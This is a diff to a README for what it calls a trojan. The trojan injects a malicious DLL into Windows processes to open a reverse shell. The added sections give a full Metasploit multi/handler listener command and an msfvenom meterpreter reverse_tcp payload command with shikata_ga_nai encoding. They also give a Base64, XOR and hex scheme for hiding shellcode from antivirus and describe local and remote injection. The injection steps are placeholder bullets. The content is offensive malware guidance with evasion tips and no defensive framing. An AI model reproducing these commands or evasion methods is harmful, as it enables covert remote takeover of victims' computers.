@@ -7,11 +7,39 @@ Trojan using dll injection of a custom library that spawns a shell on a target m
 
 This malware injects a malicious library into a target process or directly creates a process and uploads the library into it, the dll contains a simple encoded base64 data that spawns a reverse shell.
 
-#### DLL
+### 0) Listener
 
-#### Local Injection
+- First i used the classic multi handler exploit to run the payload: 
+``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
 
-#### Remote Injection
+- The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
+``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
+
+### 0.1) Encrypter:
+
+- First we encode binary data into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more;
+- Secondly we apply XOR encryption using a single-byte key; 
+- Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.
+
+### 1) DLL
+The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it decodes the base64 encoded data and uploads it to memory. Once uploaded, the data holding the shellcode will start the reverse shell with the attacker machine.  
+
+### 2) Local Injection
+
+The local injection takes the dynamic library which is already located into the disk (basically useless, just a sample), creates a process and injects the library into it. Here is a detailed explanation: 
+
+- aaa
+- bbb
+- ccc
+
+### 3) Remote Injection
+
+The remote injection dumps the dynamic library into disk (might get detected tho as anything that gets written into disk is automathically scanned by the antivirus), looks for a specific process and injects the library into it. Here is a detailed explanation: 
+
+- aaa 
+- bbb
+- ccc
+
 
 # 🛡 Obfuscation and AV Detection 
 
